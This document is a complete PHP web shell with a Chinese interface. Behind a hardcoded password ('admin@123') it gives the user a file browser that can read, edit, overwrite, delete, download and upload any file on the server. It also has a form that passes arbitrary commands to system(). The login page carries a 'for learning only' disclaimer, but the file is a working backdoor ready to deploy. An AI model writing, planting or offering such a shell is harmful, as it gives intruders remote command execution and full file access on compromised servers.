<?php
session_start(); // 启动会话

$password = 'admin@123'; // 设置登录密码

function authenticate() {
    global $password;
    if (isset($_POST['action']) && $_POST['action'] == 'login' && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
    }
    if (isset($_GET['action']) && $_GET['action'] == 'logout') {
        session_destroy();
        header("Location: ?");
        exit;
    }
    if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
        show_login();
        exit;
    }
}

function show_login() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登录</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f7fa;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            width: 300px;
        }
        .login-container h2 {
            margin-bottom: 1rem;
            text-align: center;
        }
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4a90e2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-container input[type="submit"]:hover {
            background-color: #357ABD;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>shell</h2>
        <form method="post">
            <input type="password" name="password" placeholder="请输入密码" required>
            <input type="hidden" name="action" value="login">
            <input type="submit" value="登录">
        </form>
        <p>仅供学习,切勿用于非法用途</p>
    </div>
</body>
</html>
HTML;
}

$dir = isset($_GET['path']) ? $_GET['path'] : '../';
authenticate(); // 调用认证函数

if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        die("文件不存在");
    }
}
function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while ($size >= 1024 && $i < 3) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function show_file($dir) {
    echo '<div class="path-nav">当前位置：' . htmlspecialchars($dir) . '</div>';
    if ($dir !== '.') {
        $parent = dirname($dir);
        echo '<div class="parent-dir"><a href="?path=' . urlencode($parent) . '">← 返回上级</a></div>';
    }
    echo '<table class="file-table"><thead><tr><th>名称</th><th>类型</th><th>大小</th><th>修改时间</th><th>操作</th></tr></thead><tbody>';
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $full_path = $dir . DIRECTORY_SEPARATOR . $file;
        $is_dir = is_dir($full_path);
        $mod_time = date("Y-m-d H:i:s", filemtime($full_path));
        $size = $is_dir ? '-' : format_size(filesize($full_path));
        echo '<tr><td>';
        if ($is_dir) {
            echo '<a href="?path=' . urlencode($full_path) . '" class="folder"><span class="icon">📁</span>' . htmlspecialchars($file) . '</a>';
        } else {
            echo '<span class="icon">📄</span>' . htmlspecialchars($file);
        }
        echo '</td><td>' . ($is_dir ? '文件夹' : '文件') . '</td><td>' . $size . '</td><td>' . $mod_time . '</td><td>';
        if (!$is_dir) {

            echo '<a href="?edit=' . urlencode($full_path) . '">编辑</a> | ';
            echo '<a href="?delete=' . urlencode($full_path) . '">删除</a> | ';
            echo '<a href="?download=' . urlencode($full_path) . '">下载</a>';
        }
        echo '</td></tr>';
    }
    echo '</tbody></table>';

    // 文件编辑功能
    if (isset($_GET['edit'])) {
        $edit_file = realpath($_GET['edit']);
        if (file_exists($edit_file) && is_file($edit_file)) {
            $content = htmlspecialchars(file_get_contents($edit_file));
            echo '<h3>编辑文件: ' . htmlspecialchars(basename($edit_file)) . '</h3>';
            echo '<form method="post" action="?save=' . urlencode($edit_file) . '">';
            echo '<textarea name="content" rows="20" cols="80">' . $content . '</textarea><br>';
            echo '<input type="submit" value="保存">';
            echo '</form>';
        }
    }



    // 文件保存功能
    if (isset($_GET['save']) && isset($_POST['content'])) {
        $save_file = realpath($_GET['save']);
        if (file_exists($save_file) && is_file($save_file)) {
            file_put_contents($save_file, $_POST['content']);
            echo '<p>文件已保存: ' . htmlspecialchars(basename($save_file)) . '</p>';
        }
    }

    // 执行命令功能
    if (isset($_POST['command'])) {
        $output = execute_command($_POST['command']);
        echo '<h3>命令输出:</h3>';
        echo '<pre class="command-output">' . htmlspecialchars($output) . '</pre>';
    }

    // 文件删除功能
    if (isset($_GET['delete'])) {
        handle_delete();
    }

    // 文件上传功能
    echo '<h3>上传文件:</h3>';
    /*echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="file" required>';
    echo '<input type="submit" value="上传" style="padding: 10px 15px;">';*/
    echo '<form method="post" enctype="multipart/form-data" style="margin: 20px 0; display: flex; align-items: center;">';
    echo '<input type="file" name="file" required style="
    padding: 10px; 
    border: 1px solid #ccc; 
    border-radius: 5px; 
    margin-right: 10px; 
    font-size: 16px; 
    cursor: pointer;
">';
    echo '<input type="submit" value="上传" style="
    padding: 10px 15px; 
    background-color: #3675f4; 
    color: white; 
    border: none; 
    border-radius: 5px; 
    cursor: pointer; 
    font-size: 16px;
">';
    echo '</form>';

    // 处理文件上传
    if (isset($_FILES['file'])) {
        $upload_dir = rtrim($dir, '/') . '/'; // 确保路径正确
        $upload_file = $upload_dir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
            echo '<p>文件上传成功: ' . htmlspecialchars(basename($upload_file)) . '</p>';
        } else {
            echo '<p>文件上传失败!</p>';
        }
    }

    // 执行命令表单
    echo '<h3>执行命令:</h3>';
    echo '<form method="post">';
    /*echo '<input type="text" name="command" placeholder="输入命令" style="width: 80%;" required>';
    echo '<input type="submit" value="执行命令" style="padding: 10px 15px;">';  */
    echo '<input type="text" name="command" placeholder="输入命令" style="
    width: 80%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
    box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);
    font-size: 16px;
    margin-bottom: 10px; /* 添加底部间距 */
" required>';

    echo '<input type="submit" value="执行命令" style="
    padding: 10px 15px;
    background-color: #bd770e; /* 绿色背景 */
    color: white; /* 白色文字 */
    border: none; /* 去掉边框 */
    border-radius: 5px; /* 圆角 */
    cursor: pointer; /* 鼠标指针 */
    font-size: 16px;
    transition: background-color 0.3s; /* 背景颜色过渡效果 */
">';
    echo '</form>';
}

function execute_command($command) {
    $output = system($command);
    return $output ? $output : '命令执行失败或没有输出。';
}

function handle_delete() {
    global $dir;
   // $file = $dir . safe_path($_GET['delete']);
    $file= realpath($_GET['delete']);
    if (!file_exists($file)) {
        return alert('文件不存在', 'danger');
    }
    return unlink($file)
        ? alert('删除成功', 'success')
        : alert('删除失败', 'danger');
}

// 以下是HTML和CSS部分
echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件浏览器</title>
    <style>
        * {margin: 0;padding: 0;box-sizing: border-box;font-family: 'Segoe UI', system-ui, sans-serif;}
        body {background: #f5f7fa;padding: 2rem;}
        .file-table {width: 100%;border-collapse: collapse;background: white;box-shadow: 0 1px 3px rgba(0,0,0,0.1);}
        .file-table th, .file-table td {padding: 10px; text-align: left; border-bottom: 1px solid #ddd;}
        .file-table th {background-color: #f2f2f2;}
        .path-nav, .parent-dir {margin: 10px 0; font-size: 16px;}
        .command-output {background: #f8f8f8; padding: 10px; border: 1px solid #ddd; border-radius: 5px;}
        .upload-form {margin: 20px 0;}
        .upload-form input[type="file"] {margin-right: 10px;}
        .logout-link {display: inline-block; margin-top: 20px; padding: 10px 15px; background-color: #0f63c3; color: white; text-decoration: none; border-radius: 5px;}
        .logout-link:hover {background-color: #edbf26;}
    </style>
</head>
<body>
HTML;

show_file($dir);
echo "<br>";
echo "<a href='?action=logout' class='logout-link'>退出</a>";
echo '</body></html>';
?>


